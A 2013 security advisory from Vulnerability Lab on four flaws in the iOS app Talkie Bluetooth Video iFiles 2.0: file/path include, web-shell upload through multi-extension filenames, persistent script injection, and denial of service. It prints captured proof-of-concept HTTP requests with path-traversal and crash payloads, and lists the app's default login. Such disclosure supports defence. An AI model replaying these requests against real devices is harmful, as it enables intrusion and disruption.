Title:
======
Talkie Bluetooth Video iFiles 2.0 iOS - Multiple Vulnerabilities


Date:
=====
2013-08-30


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=1062


VL-ID:
=====
1063


Common Vulnerability Scoring System:
====================================
8.8


Introduction:
=============
Talkie Bluetooth Video iFiles allows you to connect two iPhone, iPod Touches, or iPads over Bluetooth and talk to each other.
Turn your iPhone or iPad into a walkie-talkie and talk to each other. Instant voice chat. No registration. No costs. Try it now.

- Video Transfer
- File Transfer
- Photo Transfer
- Video Music Player
- Video playback of .mp3, .mp4, and .mov formats

A device with microphone is required. Bluetooth or wifi connection required. Range depends on local wireless coverage.
No connection via Internet or telephone network.

(Copy of the Homepage:  https://itunes.apple.com/de/app/talkie-bluetooth-video-ifiles/id593553087 )


Abstract:
=========
The vulnerability laboratory research team discovered multiple vulnerabilities in the Talkie Bluetooth Video iFiles v2 application (Apple iOS - iPad & iPhone).


Report-Timeline:
================
2013-08-30:    Public Disclosure (Vulnerability Laboratory)


Status:
========
Published


Affected Products:
==================
Apple AppStore
Product: Talkie Bluetooth Video iFiles  2.0


Exploitation-Technique:
=======================
Remote


Severity:
=========
Critical


Details:
========
1.1
A local file/path include web vulnerability is detected in the Talkie Bluetooth Video iFiles v2 application (Apple iOS - iPad & iPhone).
The file include vulnerability allows remote attackers to include (upload) local file or path requests to compromise the application or service.

The vulnerability is located in the upload.html file when processing to add (upload) files with via POST method request manipulated filenames.
The attacker can inject local path or files to request context and compromise the mobile device or web service. The validation has a bad side
effect which impacts the risk to combine the attack with persistent injected script code.

Exploitation of the local file include web vulnerability requires no user interaction or privilege application user account with password.
Successful exploitation of the vulnerability results in unauthorized local file and path requests to compromise the device or application.

Vulnerable Application(s):
				[+] Talkie Bluetooth Video iFiles v2.0 - ITunes or AppStore (Apple)

Vulnerable Module(s):
				[+] File Upload (FileMgr) - (http://localhost:1818/upload.html)

Vulnerable Parameter(s):
				[+] filename

Affected Module(s):
				[+] Index File Dir Listing (http://localhost:1818/)



1.2
An arbitrary file upload web vulnerability is detected in the Talkie Bluetooth Video iFiles v2 application (Apple iOS - iPad & iPhone).
The arbitrary file upload issue allows a remote attacker to upload files with multiple extensions to bypass the validation for unauthorized access.

The vulnerability is located in the upload module when processing to upload files with multiple ending extensions. Attackers are able to upload
a php or js web-shells by renaming the file with multiple extensions. The attacker uploads for example a web-shell with the following name and
extension image.jpg.js.php.jpg . The attacker needs to open the file in the web application and deletes the .jpg file extension to access the
picture with elevated access rights.

Exploitation of the arbitrary file upload web vulnerability requires no user interaction or privilege application user account with password.
Successful exploitation of the vulnerability results in unauthorized file access because of a compromise after the upload of web-shells.

Vulnerable Application(s):
				[+] Talkie Bluetooth Video iFiles v2.0 - ITunes or AppStore (Apple)

Vulnerable Module(s):
				[+] File Upload (FileMgr)  - (http://localhost:1818/upload.html)

Vulnerable Parameter(s):
				[+] filename (multiple extensions)

Affected Module(s):
				[+] Index File Dir Listing (http://localhost:1818/[FILE PATH]/FILE_NAME)


1.3
A persistent input validation web vulnerability is detected in the Talkie Bluetooth Video iFiles v2 application (Apple iOS - iPad & iPhone).
The bug allows remote attackers to implement/inject own malicious persistent script codes (application side) via POST method.

The vulnerability is located in the `Upload File` module of the web-server interface (http://localhost:1818) when processing to
request via POST method manipulated `filename`. The file name will be changed to the path value without secure filter, encode or
parse mechanism. The injected script code will be executed in the main index file dir folder listing of the mobile application.

Exploitation of the persistent web vulnerability requires low user interaction and no privilege application user account with a password.
Successful exploitation of the vulnerability can lead to persistent session hijacking (customers), account steal via persistent web attacks,
persistent phishing or persistent module context manipulation.

Vulnerable Application(s):
				[+] Talkie Bluetooth Video iFiles v2.0 - ITunes or AppStore (Apple)

Vulnerable Module(s):
				[+] Add File (Upload)

Vulnerable Parameter(s):
				[+] filename

Affected Module(s):
				[+] Index File Dir Listing (http://localhost:1818)



1.4
A remote denial of service vulnerability is detected in the Talkie Bluetooth Video iFiles v2 application (Apple iOS - iPad & iPhone).
The vulnerability allows remote attackers to crash the mobile application by using invalid large requests.

The vulnerability is located in the commit parameter when processing manipulated POST parameters. Attackers can request via POST
the mobile application frontend to crash down with special chars the web-server because of a memory restriction issue.

Exploitation of the vulnerability requires no privilege application user account and no user interaction. Successful exploitation
results in stable application cash & mobile app slide freeze.


Vulnerable Application(s):
				[+] Talkie Bluetooth Video iFiles v2.0 - ITunes or AppStore (Apple)

Vulnerable Module(s):
				[+] Index

Vulnerable Parameter(s):
				[+] commit

Affected Module(s):
				[+] Index File Dir Listing (http://localhost:1818)


Proof of Concept:
=================
1.1
The local file include web vulnerability can be exploited by remote attackers without privileged application user account
and also without user interaction. For demonstration or reproduce ...

--- Session Logs ---
Status: 200[OK]

POST http://192.168.2.104:1818/files
Load Flags[LOAD_BYPASS_CACHE  ]
Content Size[30]
Mime Type[text/plain]


Request Headers:

Host[192.168.2.104:1818]

User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0]

Accept[application/json, text/javascript, */*; q=0.01]

Accept-Language[en-US,en;q=0.5]

Accept-Encoding[gzip, deflate]

DNT[1]

X-Requested-With[XMLHttpRequest]


Referer[http://192.168.2.104:1818/upload.html]

Content-Length[2328]

Content-Type[multipart/form-data; boundary=---------------------------115182800121606]

Connection[keep-alive]

Pragma[no-cache]

Cache-Control[no-cache]


Post Data:
      POST_DATA[-----------------------------115182800121606
Content-Disposition: form-data; name="newfile"; filename="../../var/mobile[FILE INCLUDE VULNERABILITY!]>"
Content-Type: text/plain
-----------------------------115182800121606--]

Response Headers:

Accept-Ranges[bytes]

Content-Length[30]

Cache-Control[private, max-age=0, must-revalidate]

Content-Type[text/plain; charset=utf-8]

Date[Mo., 02 Sep 2013 11:32:38 GMT]


--- Session Logs ---


Reference(s):
http://localhost:1818/upload.html


PoC:
<tr>  <td> <img src="http://192.168.2.104:1818/d_store/url.jpeg" height="72" width="72"></td>
<td><a href="/files/../../var/mobile[FILE INCLUDE VULNERABILITY!]"
class="file">../../var/mobile[FILE INCLUDE VULNERABILITY!]</a></td><td class="del">
<form action="/files/../../var/mobile[FILE INCLUDE VULNERABILITY!]"
method="post"><input name="_method" value="delete" type="hidden"><input name="commit"
value="Delete" class="button" type="submit"></form></td></tr>





1.2
The local file include web vulnerability can be exploited by remote attackers without privileged application user account
and also without user interaction. For demonstration or reproduce ...

--- Session Logs ---
Status: 200[OK]

POST http://192.168.2.104:1818/files
Load Flags[LOAD_BYPASS_CACHE  ]
Content Size[65] Mime Type[text/plain]


Request Headers:

Host[192.168.2.104:1818]

User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0]

Accept[application/json, text/javascript, */*; q=0.01]

Accept-Language[en-US,en;q=0.5]

Accept-Encoding[gzip, deflate]

DNT[1]

X-Requested-With[XMLHttpRequest]


Referer[http://192.168.2.104:1818/upload.html]

Content-Length[98373]

Content-Type[multipart/form-data; boundary=---------------------------262972298416880]

Connection[keep-alive]

Pragma[no-cache]

Cache-Control[no-cache]


Post Data:
      POST_DATA[-----------------------------262972298416880
Content-Disposition: form-data; name="newfile"; filename="arbitrary-file-upload.png.txt.iso.js.html.php.jpg"
Content-Type: image/jpeg
?PNG
--- Session Logs ---


PoC:
http://localhost:1818/files/arbitrary-file-upload.png.txt.iso.js.html.php.jpg


<tr>  <td> <img src="http://192.168.2.104:1818/d_store/arbitrary-file-upload.png.txt.iso.js.html.php.jpg"
height="72" width="72"></td>  <td><a href="/files/arbitrary-file-upload.png.txt.iso.js.html.php.jpg" class="file">
arbitrary-file-upload.png.txt.iso.js.html.php.jpg</a></td><td class="del">
<form action="/files/arbitrary-file-upload.png.txt.iso.js.html.php.jpg" method="post"><input name="_method"
value="delete" type="hidden"><input name="commit" value="Delete" class="button" type="submit"></form></td></tr>




1.3
The persistent input validation web vulnerability can be exploited by remote attackers with low required user interaction.
For demonstration or reproduce ...

PoC:
<table border="0" cellpadding="0" cellspacing="0">
<thead>
<tr><th width="100">Icon</th><th>Name</th><th class="del">Delete</th></tr>
</thead>
<tbody id="filelist">
<tr>  <td> <img src="http://192.168.2.104:1818/d_store/<[PERSISTENT INJECTED SCRIPT CODE!]>" height="72"
width="72"></td>  <td><a href="/files/url.jpeg" class="file">url.jpeg</a></td>


Reference(s):
http://localhost:1818/
http://localhost:1818/upload.html





1.4
The denial of service web vulnerability can be exploited by remote attackers without privileged application user account and
also without user interaction. For demonstration or reproduce ...

--- Session Logs ---
Status: pending[]

POST http://192.168.2.104:1818/files/Disclaimer.txt
Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ]
Content Size[unknown] Mime Type[unknown]


Request Headers:

Host[192.168.2.104:1818]

User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0]

Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]

Accept-Language[en-US,en;q=0.5]

Accept-Encoding[gzip, deflate]

DNT[1]

Referer[http://192.168.2.104:1818/]

Post Data:
      _method[1]
      commit[-1'#']


--- Session Logs ---

Note: The mobile web application cashs down when processing to interpret to context.



1.5

user: 		tom
password: 	123456
email: 		a@b.com
Port: 		1818


NOTE: Standard Password for protected Server  ;)


Risk:
=====
1.1
The security risk of the local file include web vulnerability is estimated as high.

1.2
The security risk of the arbitrary file upload vulnerability is estimated as critical.

1.3
The security risk of the persistent input validation web vulnerability is estimated as medium(+).

1.4
The security risk of the remote denial of service web vulnerability is estimated as medium(-).


Credits:
========
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties,
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com
Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       - admin@evolution-sec.com
Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),
modify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.

				Copyright � 2013 | Vulnerability Laboratory [Evolution Security]



--
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@vulnerability-lab.com